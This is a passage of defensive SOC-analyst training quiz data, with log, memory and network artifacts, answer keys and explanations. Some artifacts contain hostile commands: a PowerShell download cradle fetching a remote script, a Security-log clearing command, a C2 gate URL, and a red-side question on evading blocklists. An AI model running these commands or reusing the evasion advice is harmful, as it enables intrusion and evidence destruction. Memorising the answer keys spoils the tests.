correct:[0,2,4],
hint:"Compare the two Accepted lines: authentication method, source, and what the source did just before. One belongs to the CI runner.",
exp:"<p>The failure burst walks usernames until 'deploy' gives in — the <b>password</b> success from the same IP seconds later is the break-in. The <b>publickey</b> success from 192[.]0[.]2[.]24 is key-based from your CI runner's range: same account, different world.</p><p>The sudo line at 02:14 turns a web foothold into a root shell — the process trail from that minute is the next artifact.</p><p>Root failures are normally noise, but here they are the prelude — context changes their meaning. And one broken host is rarely alone: the IP gets hunted everywhere.</p>"},
{"id":"H02","t":"parts","title":"The scanner says clean. The network disagrees.","pts":3,"seq":true,
kw:["EDR","Correlation rules","Memory forensics / RAM capture","malfind / RWX injection","Log aggregation & correlation"],
th:["Memory & Malware Analysis","Log Analysis & SIEM"],
scn:"FIN-DB01. Your EDR console: last scan 03:00, 'no threats found'. Your aggregation dashboard: firewall shows 57 connections to 203[.]0[.]113[.]44:443 at a 55-second cadence, ~410 B each; DNS shows TXT queries to mail-secure[.]example every 5 minutes. Walk the conflict down.",
art:[{l:"Two consoles, one host",h:"<pre class='log'>EDR:    FIN-DB01  scan 03:00  verdict: clean, no threats\nFW:     10[.]20[.]4[.]8 → 203[.]0[.]113[.]44:443  ×57  ~55 s cadence  ~410 B\nDNS:    FIN-DB01  TXT x9f2k7….mail-secure[.]example  every 300 s</pre>"}],
parts:[
{q:"The EDR says clean; the network says beacon. What now?",
opts:["Trust the network signals and dig deeper — EDR verdicts can miss memory-resident implants","Close the alert — a clean EDR scan ends the discussion","Reboot the host to clear whatever it is"],c:0},
{q:"Which evidence do you collect first?",
opts:["A RAM capture while the host is still running","A full disk image before anything else volatile","Three more EDR scans with different signatures"],c:0},
{q:"Memory analysis shows injected PAGE_EXECUTE_READWRITE code inside svchost.exe; no file on disk matches. What class of problem is this?",
opts:["Fileless / memory-resident malware — disk scans were never going to see it","A false positive in the memory scanner — svchost always looks like this","A hardware fault on the network card"],c:0}],
hint:"Each step: what does this tool actually look at? Disks, memory and flows are different worlds.",
exp:"<p><b>Step 1</b> — disk-focused scans cannot see implants that live only in memory. When disk says clean and the wire says beacon, the wire wins and the investigation continues.</p><p><b>Step 2</b> — the implant's home is RAM, and RAM dies at power-off, so a memory capture comes before imaging. More scans of the same disk add nothing.</p><p><b>Step 3</b> — executable private memory inside a trusted process with no file on disk is fileless malware: the compromise lives in process memory, which is exactly why the EDR's disk verdict was blind. malfind-style RWX findings plus the flow cadence are the correlated proof.</p>"},
{"id":"H03","t":"terminal","title":"Name the process behind the socket","pts":2,
kw:["netstat / ss / lsof","Process analysis","Unusual ports & protocol mismatch"],
th:["Host & Endpoint Analysis"],
scn:"IDS flagged WEB01 opening TLS sessions to 203[.]0[.]113[.]42:8443 every minute. On WEB01 itself, the local side is a listener on port 8444. Management wants the PID, the process name, and the binary path behind it — from the shell.",
q:"In the terminal, run a command that reveals the process listening on port 8444 and the binary path behind it. You decide the tool.",
term:{banner:"web01 — Ubuntu 22.04 — you have sudo\nOperational goal: PID + process name + binary path behind the 8444 listener.",
prompt:"analyst@web01:~$",placeholder:"(operational goal above — choose your own command)"},
accept:["^(?:sudo )?lsof\\b.*8444","^(?:sudo )?ss\\b.*8444","^(?:sudo )?netstat\\b.*8444","^(?:sudo )?fuser\\b.*8444"],
acceptShow:"lsof -i :8444   — or —\nss -tulpn | grep 8444   — or —\nnetstat -tulpn | grep 8444",
out:"svcupd  4127  root   6u  IPv4  30211  0t0  TCP *:8444 (LISTEN)\n→ binary: /usr/local/bin/svcupd (deleted on disk)",
hint:"No tool is named on purpose. The classic families that map ports to processes are lsof, ss and netstat — all accepted if they name the port.",
exp:"<p>Any of the three families answers the question: <code>lsof -i :8444</code> maps the socket straight to PID and command; <code>ss -tulpn</code> (or <code>netstat -tulpn</code>) lists listeners with PIDs, then you grep for 8444.</p><p>The realistic result is the uncomfortable one: an unsigned binary in /usr/local/bin that shows as <i>deleted on disk</i> while still running — a strong indicator that the implant loaded into memory and cleaned up after itself.</p>"},
{"id":"H04","t":"qcm","title":"Two TLS streams in one pcap","pts":1,
kw:["Wireshark","Display & BPF filters","C2 beaconing","Baselines & anomaly detection","Full packet capture (FPC)"],
th:["Network Traffic & Packet Analysis"],
scn:"A full packet capture (FPC) from the core SPAN port holds two long TLS conversations. Wireshark summarizes them below.",
art:[{l:"Wireshark stream summary (display filters: tcp.stream eq 0 / eq 1)",h:"<table class='t'><tr><th>Stream</th><th>Peer</th><th>SNI</th><th>Duration</th><th>Packets</th><th>Bytes</th><th>Pattern</th></tr>"+
"<tr><td>0</td><td>203[.]0[.]113[.]10:443</td><td>updates-cdn[.]example</td><td>18 min</td><td>9,204</td><td>14.2 MB ↓</td><td>one large burst; valid cert chain to a public CA</td></tr>"+
"<tr><td>1</td><td>203[.]0[.]113[.]44:443</td><td>random-cdn[.]example</td><td>3 h 12 min</td><td>1,180</td><td>460 KB total</td><td>380-byte POST every 60 s ± 2 s</td></tr></table>"}],
q:"One of the two streams is a beacon. Which one — and why?",
opts:["Stream 0 — a 14 MB bulk download to one host is exfiltration, whatever the certificate says","Stream 1 — small fixed-interval uploads for hours is the C2 shape; stream 0 fits an update baseline","Both — any TLS session to a previously unseen domain is malicious by definition","Neither — TLS encrypts the payload, so nothing useful can ever be concluded"],
c:1,
hint:"Size is not the tell. Cadence is. Compare each stream's shape against what software updates and C2 check-ins look like.",
exp:"<p><b>Stream 1</b> is the beacon: steady, clock-like 60-second posts of a few hundred bytes, for hours, is check-in behavior — an implant reporting to its handler. Volume is tiny because commands and status fit in a few hundred bytes.</p><p><b>Stream 0</b> — one big download from a software-update CDN with a valid certificate chain matches an update baseline. Bulk transfer alone is not exfiltration.</p><p>'Unseen domain' and 'encrypted so unknowable' are both wrong: FPC + flow shape let you judge behavior even through TLS.</p>"},
{"id":"H05","t":"qcm","title":"The old domain that changed hands","pts":1,
kw:["WHOIS","Nameserver changes","Domain age & creation date","Registrar & WHOIS privacy","Reverse DNS (PTR)"],
th:["DNS & Domain Analysis"],
scn:"Your vendor portal <code>vendor-portal[.]example</code> starts failing certificate checks. Registration data below — and the domain is twelve years old, honestly registered.",
art:[{l:"WHOIS + DNS data",h:"<pre class='log'>Domain Name:      vendor-portal[.]example\nCreated Date:     2014-03-02  (12 years old)\nRegistrar:        TrustedRegistrar Inc\nRegistrant:       Vendor Portal Ltd  (no privacy redaction)\nUpdated Date:     2026-10-01\nName Server:      ns1.badcloud[.]example   (since 2026-10-01)\n                  previously ns1.legacy-dns[.]example\nReverse DNS (PTR): still resolves to the old hosting range</pre>"}],
q:"The domain is old and registered honestly. Where is the actual red flag?",
opts:["The 2014 creation date shown in the WHOIS record is clearly forged","The missing WHOIS privacy shield proves the domain was stolen","The October 1 update moved DNS to a different provider's nameservers","The missing DNSSEC signing on the zone proves a hostile takeover"],
c:2,
hint:"Age and honesty reduce suspicion — so look at what changed last week, not what is ancient.",
exp:"<p><b>The nameserver move</b> — a twelve-year-old vendor domain suddenly resolving through a different provider's nameservers fits exactly one worrying story: someone with registrar access redirected where the name points. That is a takeover or an expired-domain re-registration signal, and it deserves an urgent registrar lock check.</p><p>An old creation date is the opposite of a flag; honest registration without privacy is common for companies; and DNSSEC being optional means its absence proves nothing. The stable PTR actually supports the domain's history.</p>"},

{"id":"H06","t":"multi","title":"Volatility: two plugins, one lie","pts":2,
kw:["Volatility","malfind / RWX injection","Hidden processes (pslist vs psscan)","PE header analysis","Memory forensics / RAM capture"],
th:["Memory & Malware Analysis"],
scn:"RAM capture from FS-01. You run the standard pass: process list, pool scan, and malfind. Read all three before answering.",
art:[{l:"Volatility output (condensed)",h:"<pre class='log'>malfind:\n  lsass.exe    PID 484   3 vads PAGE_EXECUTE_READWRITE, first bytes: MZ…\n  explorer.exe PID 1180  1 vad  PAGE_EXECUTE_READWRITE, first bytes: MZ…\npslist (active list):\n  lsass.exe 484 present\npsscan (pool scan):\n  lsass.exe 484 present\n  lsass.exe 2144 present   ← absent from pslist\n  svchost.exe -k netsvcs  from C:\\Windows\\System32 (present, normal)</pre>"}],
q:"Select every suspicious finding or the right follow-up action.",
opts:["malfind hits with MZ headers inside lsass.exe and explorer.exe — injected code in trusted processes","An lsass.exe visible to psscan but missing from pslist — a hidden process","The svchost.exe -k netsvcs instance from System32 is the hollowed or faked one","RWX private memory carrying an MZ header is normal and expected inside lsass.exe","Pull strings and the payload hash from the injected regions for IoCs, then isolate the host"],
correct:[0,1,4],
hint:"One line is the definition of normal. One option repeats a normal line as if it were proof. Two findings are the smoke; one action is the right next step.",
exp:"<p><b>malfind hits</b> — lsass and explorer should never carry executable private memory; RWX regions starting with MZ (the PE header magic) mean real code was written into them — injection or hollowing.</p><p><b>pslist vs psscan</b> — the pool scan finds processes by walking raw memory, the active list asks the kernel. An lsass only in psscan is being hidden by a DKOM-style unlink — a second, fake lsass.</p><p><b>svchost -k netsvcs from System32</b> is the textbook normal service host — the near-miss: it looks important, but it is the control line.</p><p>RWX + MZ in lsass is never normal, and extracting strings/hashes from the injected regions is exactly how the payload becomes an IoC.</p>"},
{"id":"H07","t":"dnd","title":"Six autostarts, two are the attacker's","pts":3,
kw:["Autoruns / startup persistence","Windows Registry Run keys","Scheduled tasks","Persistence mechanisms","EPP / antivirus exclusions"],
th:["Host & Endpoint Analysis"],
scn:"Autoruns export from FS-01 after a suspected incident. Two entries are attacker persistence; four are legitimate software that merely looks odd. Judgment, not pattern-matching.",
q:"Drag each entry to the right basket.",
bins:[{label:"Legitimate software"},{label:"Attacker persistence"}],
chips:[
{h:"OneDrive.exe — signed Microsoft, C:\\Program Files\\Microsoft OneDrive\\",b:0},
{h:"cmpapi.exe — C:\\Windows\\System32\\cmpapi.exe, unsigned, not shipped with any Windows image",b:1},
{h:"Teams.exe — signed Microsoft, C:\\Program Files\\",b:0},
{h:"HKCU Run: OneDriveSyncSvc → …\\AppData\\…\\OneDriveStandaloneUpdater.exe (signed Microsoft)",b:0},
{h:"Scheduled task \\MicrosoftEdgeUpdateCore\\ → C:\\ProgramData\\EdgeCore\\msedgeupd.exe (unsigned, folder created yesterday)",b:1},
{h:"SecurityHealthSystray.exe — signed Microsoft, C:\\Windows\\System32\\",b:0}],
hint:"Two entries borrow the naming style of system tools or vendors. Check signature, expected folder, and whether the Windows image actually contains that file.",
exp:"<p><b>cmpapi.exe</b> — a plausible name in the right folder is the whole trick: it is unsigned and exists in no Windows image. Attackers name implants after real system components precisely because analysts pattern-match on path+name.</p><p><b>msedgeupd.exe task</b> — mimics a browser updater; unsigned binary in ProgramData in a folder that did not exist until yesterday. Persistence via scheduled task.</p><p>The others are signed Microsoft binaries — even the user-profile OneDrive updater, which really does run from AppData; signature beats 'wrong-looking folder'. And before you ask: no, the fix is not an EPP exclusion for these paths.</p>"},
{"id":"H08","t":"multi","title":"Ninety-one destinations, one rhythm","pts":2,
kw:["NetFlow / IPFIX flow analysis","Zeek (Bro) connection logs","Deep packet inspection (DPI)","C2 beaconing","Unusual ports & protocol mismatch"],
th:["Network Traffic & Packet Analysis"],
scn:"The aggregation layer shows FIN-DB01 talking to 91 different external IPs across one /24 over 12 hours. Each session is TLS, 380–450 bytes, roughly 60 seconds apart, and the destination port hops: 443, then 446, 447, 452…",
art:[{l:"NetFlow v9 / IPFIX + Zeek conn.log (condensed)",h:"<pre class='log'>09:00:00  10[.]20[.]4[.]8 → 198[.]51[.]100[.]30:443  tls  420 B\n09:01:02  10[.]20[.]4[.]8 → 198[.]51[.]100[.]31:446  tls  410 B\n09:02:01  10[.]20[.]4[.]8 → 198[.]51[.]100[.]32:447  tls  395 B\n…  91 destinations in 198[.]51[.]100[.]0/24, ~60 s apart, 12 h\n(Zeek conn.log: all TLS, JA3 constant across destinations)</pre>"}],
q:"Select every correct read of this traffic.",
opts:["Fixed cadence + tiny uniform payloads + rotating destinations = C2 using rotation to survive single-IP blocking","Confirm with deep packet inspection (DPI) on egress: read the TLS SNI the client asks for","This is peer-to-peer software distribution — CDN-style hopping across many ports is normal","Blocking all 91 destinations at the firewall closes the case for good","Correlate with EDR: which process on DB-01 opens these sockets?"],
correct:[0,1,4],
hint:"The near-miss option copies a real-world excuse. CDNs hit many IPs — but not one fixed 60-second drumbeat with identical byte counts.",
exp:"<p>The three <b>C2 tells</b> together: a clock-steady cadence, uniform tiny payloads, rotating destinations (and one constant TLS fingerprint). Rotation means single-IP blocks are worthless, and hopping ports like 446/447 is a protocol-mismatch trick to defeat per-port rules.</p><p><b>DPI/SNI</b> — flows prove shape; the SNI inside the TLS ClientHello names the infrastructure so you can block domains too. <b>EDR correlation</b> names the process — the artifact that turns a network finding into a host finding.</p><p>P2P distribution is the decoy: CDNs fan out, yes, but not on a fixed drumbeat with identical sizes, and never one host alone at 03:00.</p>"},
{"id":"H09","t":"multi","title":"Two long labels — one is fine, one is a tunnel","pts":2,
kw:["DNS tunneling","Passive DNS (pDNS)","dig","DNS record types (A, MX, TXT, NS)","Baselines & anomaly detection"],
th:["DNS & Domain Analysis"],
scn:"The resolver log mixes two kinds of long names. Distinguishing them is the difference between an alert and a false positive.",
log:{l:"Resolver log (excerpt)",lines:[
'09:00:01  WS-12   A     images-cdn[.]example                    → 198[.]51[.]100[.]60',
'09:00:02  WS-12   A     img-77f3aa2b.images-cdn[.]example       → 198[.]51[.]100[.]61',
'09:00:03  MAIL-01 MX    example-corp[.]example                  → mx1.mailhost[.]example',
'03:00:11  FIN-DB01 TXT  x9f2k7v1q8m3p5w2z…(90 chars).tunnel-relay[.]example',
'03:00:13  FIN-DB01 TXT  q1z8p4n6r0t2y7u5a…(90 chars).tunnel-relay[.]example',
'03:00:15  FIN-DB01 TXT  m4n7v2c9b6d1f8s3g…(90 chars).tunnel-relay[.]example',
'(FIN-DB01: 6,204 TXT queries to tunnel-relay[.]example overnight)']},
filter:true,
q:"Select every correct statement.",
opts:["TXT bursts with random 90-character labels to one zone from one host = DNS tunneling","Long subdomains under the images-cdn[.]example hostname prove tunneling on their own","Confirm from a lab host with dig TXT against the zone, and pull passive DNS (pDNS) history for it","The MX lookup for the mail host at 09:00:03 is the actual exfiltration channel","Query volume alone — 6,204 queries in one night — is proof enough of tunneling"],
correct:[0,2],
hint:"Ask about record type, randomness, and rhythm. Then ask what a backup job does to volume.",
exp:"<p><b>The tunnel</b> — TXT record type (made to carry blobs), high-entropy labels (data, not hostnames), one fixed zone, one host, machine rhythm. That is data leaving inside DNS questions.</p><p><b>The CDN names</b> — long but <i>structured</i> labels under one service, A records, human-daytime rhythm: sharded image hosts, normal. Long labels alone are a classic false positive.</p><p><b>Confirmation</b> — dig from a lab host shows what the zone answers; pDNS history shows how young the zone is (this one registered six days ago — a newly registered domain, another point for the verdict).</p><p>Volume alone proves nothing: backup or monitoring jobs spike volume too. And MX lookups are mail routing, not exfiltration.</p>"},
{"id":"H10","t":"multi","title":"The correlation rule that watches nothing","pts":2,
kw:["SIEM","Correlation rules","Password spraying","Log aggregation & correlation"],
th:["Log Analysis & SIEM"],
scn:"A password-spray campaign ran for three weeks against your VPN. Hundreds of accounts, two guesses each, no lockouts — and this rule, reviewed below, never fired once.",
art:[{l:"SIEM rule as deployed",h:"<pre class='log'>index=wineventlog EventCode=4625\n| stats count by user\n| where count > 100\n| alert  (no time window configured)</pre>"}],
q:"Select every genuine flaw in this rule.",
opts:["It counts per user — a spray that touches hundreds of accounts one or two times each stays invisible","No time window: the count runs forever, so no burst can ever be detected as a burst","EventCode=4625 is the wrong Windows event ID to use for failed logon detection","Alerting instead on successful logons (4624) with the same logic would fix the rule"],
correct:[0,1],
hint:"Two flaws are structural (what it counts, over what time). Two options are simply wrong about Windows events.",
exp:"<p><b>Grouped by user</b> — spraying is defined by spreading attempts across many accounts. Counting per user measures brute force, not spray; aggregate by source IP instead.</p><p><b>No time window</b> — 'more than 100 ever' is a number that only ratchets up; without a rolling window there is no burst to detect. 20 failures in 5 minutes grouped by source IP is the rule this should have been.</p><p>4625 is exactly the failed-logon event — the rule watches the right event with the wrong shape. And successes are the aftermath; they belong in a different detection.</p>"},
{"id":"H11","t":"multi","title":"02:12 — the log that cleaned itself","pts":2,
kw:["Log clearing (Event 1102) / anti-forensics","Windows Event IDs (4624 / 4625 / 4688 / 4720 / 1102)","Windows Event logs"],
th:["Log Analysis & SIEM"],
scn:"FS-01's Security log, last night. Read the sequence and the gap.",
log:{l:"Windows Security log — FS-01",lines:[
'02:11:47  4624  Logon Type 9 (NewCredentials)  User: svc-backup   Source: 10[.]20[.]1[.]44',
'02:12:03  4688  New process: cmd.exe                              User: svc-backup',
'02:12:31  4688  New process: wevtutil.exe cl Security             User: svc-backup',
'02:12:31  1102  The audit log was cleared                         User: svc-backup',
'02:13:02  —— stored events resume at 04:40:19 ——']},
filter:true,
q:"Select every correct statement.",
opts:["1102 plus wevtutil cl = deliberate log clearing — anti-forensics on a compromised host","svc-backup doing Type 9 logons nightly is routine service behavior","The 02:13–04:40 silence in stored events is itself a tamper indicator","Alert on 1102 from service accounts and treat the host as compromised"],
correct:[0,2,3],
hint:"Ask who clears logs at 02:12, right after running wevtutil — and what you can no longer see.",
exp:"<p><b>The sequence is the confession</b>: a service account logs in with NewCredentials, opens cmd, runs <code>wevtutil cl Security</code>, and event 1102 confirms the audit log was cleared. Clearing logs is what attackers do when they are done with a stage.</p><p><b>The gap</b> — from 02:13 to 04:40 nothing was stored: either logging was stopped or more clearing happened. A hole in the record is as meaningful as any event in it.</p><p>Type 9 by a service account at night is nobody's routine — 'service behavior' is the wrong defense, and waiting for a second opinion before treating the host as compromised wastes the containment window.</p>"},
{"id":"H12","t":"fib","title":"Decode the cradle","pts":2,
kw:["PowerShell script block logging","Static vs dynamic analysis","URL analysis"],
th:["Host & Endpoint Analysis"],
scn:"Event 4688 from FIN-WB-11: <code>powershell -nop -w hidden -enc SQBFAFgA…</code>. Script block logging captured the decoded line: <code>IEX (New-Object Net.WebClient).DownloadString('hxxp://192[.]0[.]2[.]144/a.ps1')</code>.",
q:"Complete the analyst's note — one term per blank.",
text:"The -enc flag means the whole script arrives [[0]] (UTF-16LE). Decoded, it pulls and runs more code from an external URL — analysts call that construct a [[1]]. The -w hidden flag hides the [[2]] so the logged-in user sees nothing.",
blanks:["base64-encoded","download cradle","console window"],
bank:["base64-encoded","download cradle","console window","rot13-encoded","reverse shell","mouse cursor"],
hint:"Encoding ≠ encryption: one flag name says it. The construct fetches and immediately executes. Hidden is the window, not the process.",
exp:"<p><b>base64-encoded</b> — -enc decodes a base64 (UTF-16LE) string and runs it; obfuscation, not protection. <b>Download cradle</b> — the IEX + WebClient pattern downloads a second stage and executes it in memory: the signature of staged, file-light attacks. <b>Console window</b> — -w hidden suppresses the visible PowerShell window, not the process itself, which is why telemetry (4688 + script block logging) still sees everything.</p><p>A reverse shell would hand an interactive prompt to the attacker — this one-liner is only the delivery mechanism, which is exactly why the next artifact to collect is a[.]ps1 itself.</p>"},

{"id":"H13","t":"parts","title":"Active attacker on the database host","pts":3,"seq":true,
kw:["Containment vs evidence preservation","Order of volatility","Memory forensics / RAM capture","Root cause analysis (RCA)","Escalation"],
th:["Detection Techniques & Response","Memory & Malware Analysis"],
scn:"FIN-DB01, right now: memory analysis shows an injected beacon inside svchost.exe, and the console session holds a Domain Admin ticket. The attacker appears active. Every choice you make costs something — choose deliberately.",
parts:[
{q:"First action?",
opts:["Isolate the host at the switch (VLAN) but keep it running","Power it off immediately to stop the attacker","Leave it running and keep watching for an hour"],c:0},
{q:"Isolated and still running. Now?",
opts:["Capture RAM, then take disk images — in that order","Run a full antivirus sweep before touching evidence","Reimage the host to be safe"],c:0},
{q:"Artifacts collected. RCA shows shadow copies deleted and a new local admin created this morning. Conclusion?",
opts:["Ransomware preparation pattern — escalate to IR and hunt the same artifacts on peers","The malware is found, delete it and close the case","Reset the one new account and move on"],c:0}],
hint:"Three trade-offs to weigh per step: attacker speed vs evidence life vs business impact.",
exp:"<p><b>Step 1</b> — VLAN isolation cuts the attacker's channel while keeping memory and sessions alive. Power-off destroys RAM (the order of volatility puts memory first) and alerts nothing; watching an active attacker with Domain Admin rights gambles the domain.</p><p><b>Step 2</b> — RAM before disk: memory dies first, disks last. Antivirus sweeps touch timestamps and can wake implants; reimaging deletes the evidence you need for root cause analysis.</p><p><b>Step 3</b> — shadow-copy deletion plus a new local admin is the ransomware onboarding checklist. The right response is escalation and hunting the same two artifacts on every peer host — not local cleanup, which leaves the campaign running.</p>"},
{"id":"H14","t":"match","title":"Technique → where it becomes visible","pts":3,
kw:["Process hollowing","Sysmon","Log clearing (Event 1102) / anti-forensics","Failed-logon bursts / brute force","DNS tunneling","Memory forensics / RAM capture"],
th:["Detection Techniques & Response","Memory & Malware Analysis"],
scn:"Detection engineering review: for each technique, name the data source that actually catches it. Wrong pairings are why some attacks go unseen.",
q:"Match each technique to the data source that reveals it.",
left:["Process hollowing","C2 over DNS-over-HTTPS","Password spraying","Audit log cleared by attacker","DLL side-loading via rundll32","Exfiltration inside DNS TXT queries"],
right:["Memory analysis — malfind / RWX inside a trusted process","TLS and flow analysis — DNS logs show nothing","Auth-log aggregation across many accounts","Event 1102 and SIEM gap alerts","Sysmon module-load events and image signatures","DNS log volume and long TXT label bursts"],
pairs:[0,1,2,3,4,5],
hint:"For each technique ask: what must the attacker touch, and which sensor sees that touch?",
exp:"<p><b>Hollowing</b> replaces a process's code in memory — only memory analysis sees it; process lists still show the honest name. <b>DoH C2</b> wraps DNS inside TLS, so DNS logs go blind — flow shape and TLS metadata remain. <b>Spraying</b> spreads failures thinly — only aggregation across accounts (by source IP, per window) raises it.</p><p><b>1102</b> fires the moment the audit log is cleared, and a SIEM-side gap alert catches even a cleared local log. <b>Side-loading</b> loads a malicious DLL into an honest-looking rundll32 — module-load telemetry and signature checks expose the odd module. <b>TXT exfil</b> is volume plus entropy in DNS logs, invisible to content filters that only watch ports.</p>"},
{"id":"H15","t":"rank","title":"Board meeting in one hour — rank the incidents","pts":2,
kw:["Alert triage","Escalation","Port scanning","Exfiltration — see RCA"],
th:["Detection Techniques & Response"],
scn:"Four live incidents, one senior analyst. The CISO wants the ranking and the reason in one hour.",
q:"Rank the incidents — investigate first what endangers the business most.",
items:["DC-01: svchost beaconing confirmed, and a Domain Admin ticket is cached in the console session","DB-05: nightly 1.9 GB outbound to an unclassified host — likely exfiltration, unconfirmed","DMZ-WAF: internet port scanning and RCE attempts — every attempt blocked by WAF rules","MKT-22: adware pop-ups — EPP contains each one automatically"],
hint:"Two questions per row: how far inside are they, and what is the blast radius if this continues tonight?",
exp:"<p><b>DC-01</b> — an active beacon on a domain controller with a cached Domain Admin ticket is the worst square on the board: attacker inside, keys reachable, blast radius the whole domain.</p><p><b>DB-05</b> — suspected exfiltration of customer data is contained to one host but touches the business directly; it outranks anything already blocked.</p><p><b>DMZ-WAF</b> — scanning and RCE attempts that the WAF stops are reconnaissance; noisy, but currently failing.</p><p><b>MKT-22</b> — contained adware is a hygiene ticket. Ranking by blast radius, not by volume, is the whole skill.</p>"},
{"id":"H16","t":"multi","title":"Why the YARA rule missed the dropper","pts":2,
kw:["YARA rules","Packing (UPX)","Strings analysis","PE header analysis"],
th:["Memory & Malware Analysis"],
scn:"Your YARA rule FIN_C2_Dropper ran across 4,000 endpoints and found nothing — but you are holding the dropper in your hand. Read the rule against the sample.",
art:[{l:"Rule + sample facts",h:"<pre class='log'>rule FIN_C2_Dropper {\n  strings:\n    $a = \"EvilGate\" ascii\n    $b = { 4D 5A 90 00 }\n  condition:\n    filesize < 50KB and $a and $b\n}\n\nsample update32.dll:  120 KB, UPX-packed,\nstrings: no \"EvilGate\" visible until unpacked\nheader: starts 4D 5A 90 00 (MZ)</pre>"}],
q:"Select every reason the rule misses the sample.",
opts:["The sample breaks the filesize < 50KB condition — it is 120 KB","Packing hides $a — the string is not visible to a static scan until the file is unpacked","YARA cannot scan packed files or DLL files at all, so it skips the sample silently","$b, the MZ header signature 4D 5A 90 00, is broken and never matches a PE file"],
correct:[0,1],
hint:"The condition has two parts. One fails on size. One fails because of what packing does to strings.",
exp:"<p><b>filesize</b> — 120 KB is not < 50 KB; the condition is false before any string is checked. Rule conditions are ANDed, so one false term kills the match.</p><p><b>Packing</b> — UPX compresses the payload; the plaintext 'EvilGate' only exists after unpacking, so a static scan of the packed file finds nothing. Fixed rules either unpack first or hunt memory where the unpacked image lives.</p><p>YARA happily scans packed files and DLLs — it just cannot see inside compression. And 4D 5A 90 00 is the standard MZ header of a PE file; $b is fine.</p>"},
{"id":"H17","t":"qcm","title":"Clean hash, dirty strings","pts":1,
kw:["Hash lookup (file reputation)","Sandbox detonation","Reputation & threat feeds","Packing (UPX)","Static vs dynamic analysis"],
th:["OSINT, Blocklists & Reputation","Memory & Malware Analysis"],
scn:"update32.dll: SHA-256 lookup returns no hits on any reputation feed. Strings show a mutex Global\\WinSvcMtx, the URL hxxp://192[.]0[.]2[.]144/gate.php, and a UPX0 section. The code-signing certificate on it: revoked.",
q:"What is the right call?",
opts:["Mark the file benign — no engine on any reputation feed in the world has ever seen this hash","Delete the file quietly from the host right away and skip the extra paperwork entirely","Wait two weeks for the antivirus signatures to slowly catch up with this sample","An unknown hash is not innocence — sandbox it and treat it as suspect: revoked cert plus C2 strings"],
c:3,
hint:"Weigh the evidence you DO have against the evidence you lack. What kind of file carries a gate.php URL?",
exp:"<p>An unseen hash means the sample is <i>new or rare</i>, not safe — that is the entire business model of fresh malware. Against that void you hold positive signals: a mutex ( implant check-in), a command-gate URL, UPX packing to resist strings analysis, and a <b>revoked</b> signing certificate.</p><p>Dynamic analysis (sandbox) resolves the question with behavior: what it injects, where it beacons, what it drops. Deleting evidence quietly and waiting for signatures are both failures of duty; the case goes up, not away.</p>"},
{"id":"H18","t":"parts","title":"Blue deploys blocklists. Red adapts.","pts":2,"seq":false,
kw:["Attacker & defender perspectives","Blocklists & DNSBL","C2 beaconing","Wireshark"],
th:["Network Traffic & Packet Analysis","Detection Techniques & Response"],
scn:"After the last incident the blue team deployed: a DNS blocklist (DNSBL) for known C2 zones, egress filtering to raw IPs, and a stricter EDR policy. Your beacon just died. Answer both sides.",
parts:[
{q:"RED: which change keeps your C2 alive longest?",
opts:["Move C2 to an HTTPS channel through a compromised but legitimate site, with fallback hosts","Repoint the same domain to a new raw IP and beacon faster","Switch to ICMP beacons every second"],c:0},
{q:"BLUE: which telemetry still exposes the new channel?",
opts:["Beacon periodicity in flow data plus an odd TLS fingerprint (JA3) to a never-seen SNI","Nothing — the blocklists ended it","Only the antivirus vendor's cloud can see it"],c:0}],
hint:"Red: what still LOOKS legitimate after every blocklist? Blue: what does the attacker still not control — rhythm and fingerprints.",
exp:"<p><b>Red</b> — the blocklists killed known-bad zones and raw IPs. What survives is traffic that borrows legitimacy: HTTPS through a compromised real site (blends with normal web), plus fallback infrastructure. Repointing the same domain dies to the same list; loud ICMP is a baseline anomaly in minutes.</p><p><b>Blue</b> — the attacker cannot change physics: a beacon has a rhythm (flow data shows it) and a TLS handshake fingerprint (JA3) that rarely matches your estate's normal. SNI to a never-before-seen host adds the third leg. Blocklists are one control — behavior is the durable detector.</p>"},
{"id":"H19","t":"qcm",c:0,"title":"Everything passed. Something is wrong.","pts":1,
kw:["Typosquatting & homoglyphs","Domain reputation","OSINT","Search-operator dorking"],
th:["OSINT, Blocklists & Reputation","DNS & Domain Analysis"],
scn:"A 'payroll re-verification' mail to 40 finance users. The gateway's verdict: SPF pass, DKIM pass, DMARC pass — the sending infrastructure is legitimately the vendor's.",
art:[{l:"Headers (condensed)",h:"<pre class='log'>Authentication-Results: spf=pass smtp.mail=bounces@legit-vendor[.]example\n                        dkim=pass header.d=legit-vendor[.]example\n                        dmarc=pass\nFrom:        \"Meridian Payroll\" &lt;payroll@meridian-pay.example&gt;\nReply-To:    billing@meridian-pav[.]example\nReturn-Path: bounces@legit-vendor[.]example\nSubject:     URGENT: payroll portal re-verification</pre>"}],
q:"Authentication passed on the real vendor domain. Where is the malicious signal?",
opts:["Reply-To points to a lookalike domain while authentication covers the vendor","SPF validation failed on the envelope sender of the vendor's message","DMARC alignment broke between the two header domains in the mail","The friendly display name shown to the users is always malicious"],
hint:"Authentication covers who SENT it. Replies go wherever Reply-To says. Read the two domains letter by letter.",
exp:"<p>The mail really comes from the vendor's infrastructure — SPF/DKIM/DMARC all pass, so options about failed authentication contradict the artifact. The trick is the <b>Reply-To</b>: victims who answer send credentials and documents to <code>meridian-pav[.]example</code> — a homoglyph/typosquat of your real domain (pav vs pay) sitting outside the vendor's authenticated world.</p><p>Display-name spoofing is common but not universal proof. The follow-up is pure OSINT: WHOIS on the lookalike (age, registrar), even dorking for the domain — and a block of the zone.</p>"},

{"id":"H20","t":"multi","title":"Two logs, one connection — depth matters","pts":2,
kw:["Sysmon","rundll32 / DLL abuse","Prefetch","Firewall logs","Unusual ports & protocol mismatch"],
th:["Host & Endpoint Analysis"],
scn:"The same connection appears in two systems. The firewall shows half the story; Sysmon shows the other half.",
art:[{l:"Firewall log vs Sysmon Event 3",h:"<pre class='log'>FW:   ALLOW 10[.]20[.]4[.]8:* → 203[.]0[.]113[.]42:8443   (no process field)\nSysmon Event 3 (network connect):\n  Image:       C:\\Users\\Public\\rundll32.exe   (unsigned copy — System32 copy intact)\n  Destination: 203[.]0[.]113[.]42:8443\n  Hash:        SHA256 9f2c…\n  Parent:      schtasks.exe</pre>"}],
q:"Select every correct statement.",
opts:["Sysmon shows image path, parent and hash — native firewall logs cannot name the process","An unsigned rundll32 copy in a user-writable folder talking to an odd port is a strong indicator","Pull Prefetch and shimcache to learn when it first ran and from where","The firewall log already proves which process made the connection","Port 8443 alone is proof of malware — no other context is ever needed"],
correct:[0,1,2],
hint:"One artifact identifies the who. One artifact only sees the where. And one execution-trace source answers 'since when'.",
